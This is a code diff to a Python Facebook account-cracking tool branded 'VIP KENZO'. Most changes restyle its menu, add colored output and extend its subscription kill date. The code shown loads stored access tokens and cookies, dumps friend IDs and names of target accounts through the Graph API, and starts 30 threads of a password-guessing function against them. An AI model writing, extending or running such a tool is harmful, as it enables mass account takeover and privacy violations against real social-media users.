@@ -18,8 +18,9 @@ from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
 import os
+from termcolor import colored
 
-import datetime;now = datetime.date.today();target = datetime.date(2023, 9, 26)
+import datetime;now = datetime.date.today();target = datetime.date(2023, 12, 26)
 if now >=target:exit("توقف الاشتراك راسل كينزو @K_N_Z_O وفعل")
 else:print("")
 
@@ -50,6 +51,15 @@ B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 C1 = '\033[2;35m'
+#. ألوان خلفية النص:
+#- خلفية حمراء: on_red
+#- خلفية خضراء: on_green
+#- خلفية صفراء: on_yellow
+#- خلفية زرقاء: on_blue
+#- خلفية بيضاء: on_white
+#- خلفية سوداء: on_black
+#- خلفية بنفسجية: on_magenta
+#- خلفية سماوية: on_cyan
 
 
 print("""\033[2;32m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠉⠉⠉⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
@@ -700,16 +710,21 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	
-	print(Z+'\x1b[38;5;208mTelegram ⌲ @K_N_Z_O  ')
-	print(F+          'VIP KENZO')
-	print(' [v-1]')
-	print(f'»  Your ID : '+str(my_id))
-	print(f'»  Your IP : {ip}')
+	print(colored("  𝐏𝐘 • @𝐊_𝐍_𝐙_𝐎  ڪينزو 🔱  ۦ ", "black", "on_red"))
 	print('')
-	print('» 1- Fishing from friends : من الاصدقاء  ')
-	print('» 2- Fishing from followers : من المتابعين ')
-	print('» 3- Crack File : مــن مــلــف  ')		
-	print('» 0- login out : تسجيل خروج كوكيز   ')
+	print(colored("  𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 𝐓𝐎𝐎l 𝐊𝐄𝐍𝐙𝐎     ", "green", "on_blue"))
+	
+	print('')
+	
+	print(b+'═════════════════════════════════════════════')
+	print(X+' [ 1 ] Fishing from friends : من الاصدقاء  ')
+	print(b+'═════════════════════════════════════════════')
+	print(X+' [ 2 ] Fishing from followers : من المتابعين ')
+	print(b+'═════════════════════════════════════════════')
+	print(X+' [ 3 ] Crack File : مــن مــلــف  ')	
+	print(b+'═════════════════════════════════════════════')
+	print(X+' [ 0 ]  login out : تسجيل خروج كوكيز   ')
+	print(b+'═════════════════════════════════════════════')
 		
 	_____heros_____ = input('\n[=] chose : ')
 	if _____heros_____ in ['1']:
@@ -769,7 +784,7 @@ def follower():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('[>>] CRACK ID LIMIT : اكتب عدد الايديات '))
+		jum = int(input('\033[2;35m 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝙳 :  '))
 	except ValueError:
 		print('{k}[✖] NOT PUBLIC ID ')
 		time.sleep(3)
@@ -782,7 +797,7 @@ def follower():
 	yz = 0
 	for met in range(jum):
 		yz+=1		
-		kl = input('[*] ID >> '+str(yz)+' : ')
+		kl = input('\033[1;34m [ • ] 𝐈𝐃  ❥ '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -826,7 +841,7 @@ def dump_massal():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	try:
-		jum = int(input('\033[1;36m>> Target Id ? عدد الايديات المستهدفه: '))
+		jum = int(input('\033[2;35m 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝙳 ⋮  '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -838,7 +853,7 @@ def dump_massal():
 	for met in range(jum):
 		yz+=1
 		#kl = input('>> Id Targ
-		userr = input('>> Id Target '+str(yz)+' : ')
+		userr = input('\033[1;34m [ • ] 𝐈𝐃  ❥  '+str(yz)+' : ')
 		uid.append(userr)
 	for userr in uid:
 		try:
@@ -849,7 +864,7 @@ def dump_massal():
 			b = ses.get("https://graph.facebook.com/"+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0],params = params,cookies = {'cookie': cok}).json()
 			for c in b["friends"]["data"]:
 				id.append(c["id"]+"|"+c["name"])
-			print(f'\033[1;32m[𝐕𝐈𝐏] - عددالايديات {h}'+str(len(id)));setting()
+			print(f'\033[2;34m [𝐕𝐈𝐏] - عدد الايديات {h}'+str(len(id)));setting()
 		except Exception as e:
 			print(e)
 	try:
@@ -1246,7 +1261,7 @@ if __name__=='__main__':
 	Login()
 	
 	Threads=[] 
-for t in range(28):
+for t in range(30):
  x = threading.Thread(target=passwrd)
  x.start()
  Threads.append(x)
